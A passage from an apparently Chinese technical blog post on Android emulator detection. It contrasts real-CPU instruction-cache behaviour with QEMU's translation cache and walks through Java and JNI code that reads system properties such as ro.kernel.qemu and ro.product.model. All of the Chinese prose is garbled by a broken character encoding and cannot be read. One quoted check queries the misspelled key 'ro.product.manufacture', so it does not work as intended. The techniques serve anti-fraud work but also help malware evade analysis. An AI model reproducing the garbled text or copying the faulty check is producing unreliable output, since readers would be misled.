è½½æœ€æ–°çš„ã€å·²è¢«ä¿®æ”¹çš„æŒ‡ä»¤ã€‚</li></ol></li><li><strong>æ£€æµ‹åˆ©ç”¨ç‚¹</strong>ï¼šå¦‚æœä¸è°ƒç”¨ <code>__clear_cache</code>ï¼ŒCPU å°±ä¼šæ‰§è¡Œ I-Cache ä¸­é™ˆæ—§çš„æŒ‡ä»¤ï¼Œå¯¼è‡´ç¨‹åºè¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ã€‚</li></ul><p><strong>æ¨¡æ‹Ÿå™¨ (QEMU) çš„è¡Œä¸º</strong></p><ul><li>**åŠ¨æ€äºŒè¿›åˆ¶ç¿»è¯‘ (Dynamic Binary Translation - DBT)**ï¼šQEMU çš„æ ¸å¿ƒæ˜¯å®ƒçš„ TCG (Tiny Code Generator)ã€‚å®ƒå¹¶éé€æ¡è§£é‡Šæ‰§è¡Œ ARM æŒ‡ä»¤ï¼Œè€Œæ˜¯å°†ä¸€ä¸ª ARM æŒ‡ä»¤å—ï¼ˆGuest Codeï¼‰åŠ¨æ€ç¿»è¯‘æˆä¸€æ®µç­‰æ•ˆçš„ã€èƒ½åœ¨å®¿ä¸» CPUï¼ˆHost CPUï¼Œé€šå¸¸æ˜¯ x86ï¼‰ä¸Šç›´æ¥è¿è¡Œçš„æœºå™¨ç å—ï¼ˆHost Codeï¼‰ã€‚</li><li><strong>ç¿»è¯‘ç¼“å­˜ä¸å†…å­˜ç›‘æ§</strong>ï¼šQEMU ä¼šç¼“å­˜è¿™äº›ç¿»è¯‘å¥½çš„ä»£ç å—ã€‚ä¸ºäº†ä¿è¯æ­£ç¡®æ€§ï¼ŒQEMU å¿…é¡»ç›‘æ§è¢«æ¨¡æ‹Ÿçš„å®¢æˆ·æœºå†…å­˜ï¼ˆGuest Memoryï¼‰ã€‚å½“ QEMU æ£€æµ‹åˆ°ä¸€æ®µå·²ç»è¢«ç¿»è¯‘è¿‡çš„ Guest Code æ‰€åœ¨çš„å†…å­˜åŒºåŸŸè¢«å†™æ“ä½œä¿®æ”¹æ—¶ï¼Œå®ƒä¼š<strong>åºŸå¼ƒï¼ˆInvalidateï¼‰</strong>æ‰å¯¹åº”çš„ã€å·²ç¼“å­˜çš„ Host Codeã€‚</li><li><strong>é‡æ–°ç¿»è¯‘ (Re-translation)<strong>ï¼šå½“æ¨¡æ‹Ÿçš„ç¨‹åºæµç¨‹å†æ¬¡è·³è½¬åˆ°é‚£æ®µè¢«ä¿®æ”¹è¿‡çš„åœ°å€æ—¶ï¼ŒQEMU ä¼šå‘ç°æ²¡æœ‰å¯ç”¨çš„ç¿»è¯‘ç¼“å­˜ï¼Œäºæ˜¯å®ƒä¼šé‡æ–°ä» Guest Memory ä¸­è¯»å–</strong>æœ€æ–°çš„æŒ‡ä»¤</strong>ï¼Œè¿›è¡Œæ–°ä¸€è½®çš„ç¿»è¯‘å’Œæ‰§è¡Œã€‚</li><li><strong>æ£€æµ‹åˆ©ç”¨ç‚¹</strong>ï¼šQEMU çš„è¿™ç§ä¸ºä¿è¯æ¨¡æ‹Ÿæ­£ç¡®æ€§è€Œè®¾è®¡çš„æœºåˆ¶ï¼Œæ°å¥½â€œå®Œç¾â€åœ°å¤„ç†äº†è‡ªä¿®æ”¹ä»£ç ã€‚å®ƒè¡¨ç°å‡ºçš„è¡Œä¸ºï¼Œç­‰åŒäºä¸€ä¸ª<strong>ç¼“å­˜æ°¸è¿œåŒæ­¥</strong>çš„ç†æƒ³åŒ–å¤„ç†å™¨ã€‚</li></ul></blockquote><p>è¯´ç™½äº†å°±æ˜¯çœŸæœºçš„<code>i-cache</code>å’Œ<code>d-cache</code>æ˜¯ä¸æ˜¯éšæ—¶åŒæ­¥çš„ï¼Œå½“<code>i-cache</code>è°ƒç”¨<code>STR(store)</code>æŒ‡ä»¤æ—¶ï¼Œæ˜¯é€šè¿‡æ•°æ®æ€»çº¿æ¥æ›´æ–°<code>d-cache</code>å’Œä¸»å­˜çš„ï¼Œå¦‚æœæ­¤æ—¶æ²¡åŠæ—¶è°ƒç”¨<code>__clear_cache</code>çš„è¯ï¼Œä¹Ÿä¼šç»§ç»­æ‰§è¡Œå½“å‰<code>cache line</code>çš„ä»£ç </p><blockquote><p><code>cache line</code>å°±æ˜¯ <strong>CPU ç¼“å­˜ (Cache) å’Œä¸»å†…å­˜ (RAM) ä¹‹é—´æ•°æ®ä¼ è¾“çš„æœ€å°å•ä½</strong>ï¼ˆæ¯•ç«Ÿå¦‚æœä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚ä»CPUä¸­è¯»å–çš„è¯ï¼Œé‚£ä¹ˆå¤ªæµªè´¹èµ„æºäº†ï¼Œå› æ­¤å°±ç›´æ¥è¯»å¾ˆå¤šä¸ªå­—èŠ‚ï¼ˆç§°ä¹‹ä¸º<code>cache line</code>ï¼‰ï¼Œå¸¸è§çš„å¤§å°æ˜¯ 32 å­—èŠ‚ã€64 å­—èŠ‚æˆ– 128 å­—èŠ‚</p></blockquote><p>è€Œæ¨¡æ‹Ÿå™¨ä¸€èˆ¬éƒ½æ˜¯ç¼“å­˜æ°¸è¿œåŒæ­¥çš„ï¼Œå³ä¼šæ‰§è¡Œæœ€æ–°ä¿®æ”¹çš„ä»£ç </p><p>è¿™é‡Œåˆ©ç”¨çš„å°±æ˜¯åœ¨çœŸæœºä¸­å¦‚æœä¸è°ƒç”¨ <code>__clear_cache</code>ï¼ŒCPU å°±ä¼šæ‰§è¡Œ <code>I-Cache</code> ä¸­é™ˆæ—§çš„æŒ‡ä»¤ï¼Œå¯¼è‡´ç¨‹åºè¡Œä¸ºä¸é¢„æœŸä¸ç¬¦</p><blockquote><p><code>__clear_cache</code> çš„ä½œç”¨å°±æ˜¯ å¼ºåˆ¶<strong>å†²åˆ·æµæ°´çº¿ï¼ˆPipeline Flushï¼‰</strong>å¹¶ä½¿ <code>I-Cache</code> å¤±æ•ˆ</p></blockquote><h3 id="onCreate-1"><a href="#onCreate-1" class="headerlink" title="onCreate"></a>onCreate</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  UIè¿›ç¨‹æ£€æµ‹ï¼Œå¯èƒ½å½±å“UIçº¿ç¨‹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">binding.btnSycnSycSimu.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            TextView textView = (TextView) <span class="built_in">findViewById</span>(R.id.btn_sycn_syc_simu);</span><br><span class="line">            textView.<span class="built_in">setText</span>(<span class="string">&quot; å†…å­˜åŒæ­¥æ˜¯å¦æ¨¡æ‹Ÿå™¨ &quot;</span> + EmulatorDetectUtil.<span class="built_in">isEmulator</span>(MainActivity.<span class="keyword">this</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>EmulatorDetectUtil.isEmulator(MainActivity.this)</code>æ¥æ£€æµ‹<code>UI</code>è¿›ç¨‹</p><p><strong>åŒæ­¥çš„ã€åœ¨å½“å‰çº¿ç¨‹å’Œå½“å‰è¿›ç¨‹ä¸­</strong>æ‰§è¡Œçš„æ–¹æ³•è°ƒç”¨</p><p>è€Œä¸Šé¢é‚£ç§æ˜¯<strong>å¼‚æ­¥çš„ã€é€šè¿‡AIDLåœ¨å¦ä¸€ä¸ªæœåŠ¡è¿›ç¨‹ä¸­</strong>æ‰§è¡Œçš„æ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        ç‰¹å¾å€¼åˆ¤æ–­æ˜¯å¦æ¨¡æ‹Ÿå™¨</span></span><br><span class="line">        binding.btnSample.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.btn_sample);</span><br><span class="line">                textView.setText(<span class="string">&quot;ç‰¹å¾ä¿¡æ¯åˆ¤æ–­æ˜¯å¦æ¨¡æ‹Ÿå™¨ &quot;</span> + AndroidDeviceIMEIUtil.isRunOnEmulator(MainActivity.<span class="built_in">this</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>AndroidDeviceIMEIUtil.isRunOnEmulator(MainActivity.this)</code>æ–¹æ³•æ¥ç‰¹å¾æ£€æµ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidDeviceIMEIUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isRunOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> EmuCheckUtil.mayOnEmulator(context);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">mayOnEmulator</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mayOnEmulatorViaQEMU(context)</span><br><span class="line">            || isEmulatorViaBuild(context)</span><br><span class="line">            || isEmulatorFromAbi()</span><br><span class="line">            || isEmulatorFromCpu();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mayOnEmulatorViaQEMU"><a href="#mayOnEmulatorViaQEMU" class="headerlink" title="mayOnEmulatorViaQEMU"></a>mayOnEmulatorViaQEMU</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  qemuæ¨¡æ‹Ÿå™¨ç‰¹å¾</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">mayOnEmulatorViaQEMU</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">qemu</span> <span class="operator">=</span> PropertiesGet.getString(<span class="string">&quot;ro.kernel.qemu&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>.equals(qemu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­getStringå‡½æ•°å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.jni;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: snail</span></span><br><span class="line"><span class="comment"> * Data: 2017/7/20 ä¸Šåˆ9:11</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertiesGet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;property_get&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">native_get</span><span class="params">(String key)</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">native_get</span><span class="params">(String key,String def)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getString</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> native_get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getString</span><span class="params">(String key,String def)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> native_get(key,def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯é€šè¿‡nativeè·å¾—</p><p>åœ¨cmakeä¸­</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(</span><br><span class="line">      <span class="comment"># è®¾ç½®soæ–‡ä»¶åç§°.</span></span><br><span class="line">       property_get</span><br><span class="line">       <span class="comment"># è®¾ç½®è¿™ä¸ªsoæ–‡ä»¶ä¸ºå…±äº«.</span></span><br><span class="line">       SHARED</span><br><span class="line">       <span class="comment"># Provides a relative path to your source file(s).</span></span><br><span class="line">       src/main/jni/property/proget.c)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/system_properties.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;android/log.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;lishang&quot;</span>,__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function"><span class="title">proGetSS</span></span></span><br><span class="line"><span class="function">        <span class="params">(JNIEnv *env, jclass clazz, jstring keyJ, jstring defJ)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *key;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    jstring rvJ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyJ == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="string">&quot;key must not be null.&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    key = (*env)-&gt;<span class="built_in">GetStringUTFChars</span>(env, keyJ, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    len = __system_property_get(key, buf);</span><br><span class="line">    <span class="keyword">if</span> ((len &lt;= <span class="number">0</span>) &amp;&amp; (defJ != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        rvJ = defJ;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        rvJ = (*env)-&gt;<span class="built_in">NewStringUTF</span>(env, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rvJ = (*env)-&gt;<span class="built_in">NewStringUTF</span>(env, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (*env)-&gt;<span class="built_in">ReleaseStringUTFChars</span>(env, keyJ, key);</span><br><span class="line"></span><br><span class="line">    error:</span><br><span class="line">    <span class="keyword">return</span> rvJ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL</span></span><br><span class="line"><span class="function">    <span class="title">proGet</span><span class="params">(JNIEnv *env, jclass clazz, jstring keyJ)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">proGetSS</span>(env, clazz, keyJ, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *className,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 JNINativeMethod *gMethods, <span class="type">int</span> numMethods)</span> </span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line"></span><br><span class="line">    clazz = (*env)-&gt;<span class="built_in">FindClass</span>(env, className);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*env)-&gt;<span class="built_in">RegisterNatives</span>(env, clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *classPathName = <span class="string">&quot;com/snail/antifake/jni/PropertiesGet&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> JNINativeMethod methods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;native_get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, (<span class="type">void</span> *) proGet&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;native_get&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span>, (<span class="type">void</span> *) proGetSS&#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="type">void</span>* reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*vm)-&gt;<span class="built_in">GetEnv</span>(vm, (<span class="type">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK)</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">registerNativeMethods</span>(env, classPathName, methods, <span class="built_in">sizeof</span>(methods)/<span class="built_in">sizeof</span>(methods[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line"></span><br><span class="line">    result = JNI_VERSION_1_4;</span><br><span class="line"></span><br><span class="line">    bail:</span><br><span class="line">    <span class="comment">//LOGI(&quot;Leaving JNI_OnLoad (result=0x%x)\n&quot;, result);</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡<code>registerNativeMethods</code>æ³¨å†Œ<code>com/snail/antifake/jni/PropertiesGet</code>ä¸‹çš„ä¸¤ä¸ªæ–¹æ³•</p><p>ç„¶å<code>proGet</code>å’Œ<code>proGetSS</code>çš„è¿”å›å€¼å˜é‡ç±»å‹å®šä¹‰ä¸º<code>JNIEXPORT jstring JNICALL</code></p><ul><li><code>JNIEXPORT</code> çš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>å°† native å‡½æ•°æ ‡è®°ä¸º â€œå¯å¯¼å‡ºç¬¦å·â€</strong></li><li><code>JNICALL</code> çš„ä½œç”¨æ˜¯<strong>ç»Ÿä¸€å‡½æ•°çš„è°ƒç”¨çº¦å®š</strong></li><li><code>jstring</code>ï¼šæ˜¯å‡½æ•°çš„<strong>è¿”å›å€¼ç±»å‹</strong>ï¼Œå¯¹åº” Java ä¸­çš„ <code>String</code> ç±»å‹</li></ul><p><code>len = __system_property_get(key, buf);</code>ä¸»è¦æ˜¯é€šè¿‡è¿™ä¸ªå‡½æ•°è¯»å–ç›¸åº”çš„æ•°æ®</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __system_property_get(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">char</span> *value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// æ•°æ®å·²ç»å­˜å‚¨åœ¨å…±äº«å†…å­˜ä¸­ï¼Œé€šè¿‡__system_property_area__ å³å¯è·å–åˆ°ï¼Œä¹‹åç­‰å¾…è¯»å–å®Œè¿”å›</span></span><br><span class="line">    <span class="type">const</span> prop_info *pi = __system_property_find(name);</span><br><span class="line">    <span class="keyword">if</span>(pi != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> __system_property_read(pi, <span class="number">0</span>, value); <span class="comment">// é˜»å¡å¼è¯»å–</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        value[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isEmulatorViaBuild"><a href="#isEmulatorViaBuild" class="headerlink" title="isEmulatorViaBuild"></a>isEmulatorViaBuild</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isEmulatorViaBuild</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.model&quot;</span>).toLowerCase().contains(<span class="string">&quot;sdk&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ro.product.manufacturer likes unknown</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.manufacturer&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.manufacture&quot;</span>).toLowerCase().contains(<span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ro.product.device likes generic</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!TextUtils.isEmpty(PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>))</span><br><span class="line">            &amp;&amp; PropertiesGet.getString(<span class="string">&quot;ro.product.device&quot;</span>).toLowerCase().contains(<span class="string">&quot;generic&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><ul><li><code>ro.product.model</code>: è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå±æ€§ï¼Œé€šå¸¸è¡¨ç¤º<strong>è®¾å¤‡çš„å‹å·</strong>ã€‚åœ¨æ¨¡æ‹Ÿå™¨ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå€¼ç»å¸¸åŒ…å« â€œsdkâ€ å­—æ ·ï¼Œä¾‹å¦‚ â€œsdk_gphone_x86â€ã€â€Android SDK built for x86â€ ç­‰ã€‚</li><li><code>ro.product.manufacturer</code>: è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå±æ€§ï¼Œè¡¨ç¤º<strong>è®¾å¤‡çš„åˆ¶é€ å•†</strong>ã€‚åœ¨æŸäº›æ¨¡æ‹Ÿå™¨ï¼ˆå°¤å…¶æ˜¯ Genymotion æˆ–ä¸€äº›æ—©æœŸæ¨¡æ‹Ÿå™¨ï¼‰ä¸­ï¼Œè¿™ä¸ªå€¼å¯èƒ½è¢«è®¾ç½®ä¸º â€œunknownâ€ æˆ–å…¶ä»–éçœŸå®åˆ¶é€ å•†çš„å­—ç¬¦ä¸²ã€‚</li><li><code>ro.product.device</code>: è¿™æ˜¯ä¸€ä¸ªç³»ç»Ÿå±æ€§ï¼Œè¡¨ç¤ºè®¾<strong>å¤‡çš„ä»£å·æˆ–åç§°</strong>ã€‚Android æ¨¡æ‹Ÿå™¨ï¼ˆAVDï¼‰é€šå¸¸ä¼šä½¿ç”¨ 